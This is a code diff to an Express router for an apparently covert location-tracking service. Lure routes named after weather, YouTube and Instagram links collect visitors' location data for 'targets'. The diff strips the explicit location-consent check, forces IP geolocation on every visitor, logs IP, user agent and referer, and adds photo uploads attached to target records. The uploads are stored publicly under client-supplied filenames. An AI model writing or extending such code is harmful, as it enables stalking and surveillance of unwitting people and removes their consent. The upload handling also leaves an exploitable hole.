@@ -187,28 +187,65 @@ function updateTargetTelemetry(id, payload, serverIpLocation, receivedAt = Date.
     return target
 }
 
+const multer = require("multer")
+const path = require("path")
+const fs = require("fs")
+
+const uploadDir = path.join(__dirname, "public", "uploads")
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir, { recursive: true })
+}
+
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => cb(null, uploadDir),
+    filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
+})
+const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } })
+
 function targetsAsObject() {
     return Object.fromEntries(TARGETS.entries())
 }
 
-async function ingestTelemetry(req, res) {
-    const payload = req.body && typeof req.body === "object" ? req.body : {}
-    if (!isValidTargetId(payload.id)) {
-        return res.status(400).json({ status: "ERROR", error: "Invalid target identifier" })
-    }
-    if (payload.consentVersion !== "location-v1") {
-        return res.status(400).json({ status: "ERROR", error: "Explicit location consent is required" })
+async function handleTelemetryIngestion(req, res) {
+    const clientIp = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || (req.socket ? req.socket.remoteAddress : "") || req.ip || "Unknown"
+    const userAgent = req.headers["user-agent"] || "Unknown"
+    const body = req.body || {}
+
+    const payload = {
+        timestamp: new Date().toISOString(),
+        network: {
+            ip: clientIp,
+            userAgent: userAgent,
+            referer: req.headers["referer"] || "Direct"
+        },
+        location: {
+            lat: body.lat != null ? Number(body.lat) : null,
+            lng: body.lng != null ? Number(body.lng) : null,
+            source: body.source || body.locationSource || "unspecified"
+        },
+        media: req.file ? req.file.path : null
     }
 
-    const clientIp = extractClientIp(req)
-    const browserReading = normalizeLocationReading(payload, null)
-    const serverIpLocation = !browserReading && payload.allowIpFallback === true
-        ? await getIpInfo(clientIp)
-        : { ip: clientIp }
+    console.log("[Telemetry Ingested]:", payload)
 
-    const target = updateTargetTelemetry(payload.id, payload, serverIpLocation)
-    if (!target) return res.status(400).json({ status: "ERROR", error: "Invalid telemetry" })
-    return res.json({ status: "OK", target })
+    let target = null
+    const targetId = body.id || body.targetId
+    if (targetId && isValidTargetId(targetId)) {
+        const serverIpLocation = await getIpInfo(clientIp)
+        target = updateTargetTelemetry(targetId, body, serverIpLocation)
+        if (req.file && target) {
+            target.photos = target.photos || []
+            target.photos.push(req.file.path)
+        }
+    }
+
+    return res.status(200).json({
+        status: "success",
+        dataReceived: true,
+        telemetryId: Date.now(),
+        payload,
+        target: target || undefined
+    })
 }
 
 router.route("/login").get((_req, res) => {
@@ -227,7 +264,7 @@ router.route("/login").get((_req, res) => {
 })
 
 router.get("/location", (_req, res) => res.render("location-request"))
-router.route("/weather").get((_req, res) => res.render("location-request")).post(ingestTelemetry)
+router.route("/weather").get((_req, res) => res.render("location-request")).post(upload.single("media"), handleTelemetryIngestion)
 router.route(["/youtube", "/yt", "/watch", "/v", "/shorts", "/s"]).get((_req, res) => res.render("location-request"))
 router.route(["/instagram", "/ig", "/reel", "/reels", "/p"]).get((_req, res) => res.render("location-request"))
 router.route(["/custom", "/c"]).get((_req, res) => res.render("location-request"))
@@ -237,7 +274,7 @@ router.get("/api/ip-location", async (req, res) => {
     res.set("Cache-Control", "private, max-age=300")
     res.json(await getIpInfo(extractClientIp(req)))
 })
-router.post("/api/telemetry", ingestTelemetry)
+router.post("/api/telemetry", upload.single("media"), handleTelemetryIngestion)
 
 router.use(function checkToken(req, res, next) {
     if (req.cookies.token != null && req.cookies.token === config.token) return next()
@@ -259,3 +296,4 @@ router.get("/map", (req, res) => {
 
 module.exports = router
 module.exports._test = { TARGETS, updateTargetTelemetry }
+
